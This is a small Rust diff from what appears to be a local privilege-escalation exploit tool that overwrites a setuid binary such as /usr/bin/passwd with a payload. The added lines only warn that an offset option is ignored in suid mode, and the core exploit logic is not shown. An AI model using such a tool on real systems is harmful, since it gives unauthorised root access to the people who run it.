@@ -57,6 +57,12 @@ fn main() -> Result<(), anyhow::Error> {
             let target_suid = opt.output.unwrap_or(PathBuf::from("/usr/bin/passwd"));
             println!("[-] Target {} will be overwritten with {}", target_suid.to_str().unwrap(), suid_payload.to_str().unwrap());
 
+            // Warn user that offset is ignored if set
+            match opt.offset {
+                Some(_) => { println!("[!] Warning: Offset is ignored in suid mode!"); }
+                None => {}
+            }
+
             // Ensure payload exists.
             if !Path::new(&suid_payload).exists() {
                 return Err(anyhow!(
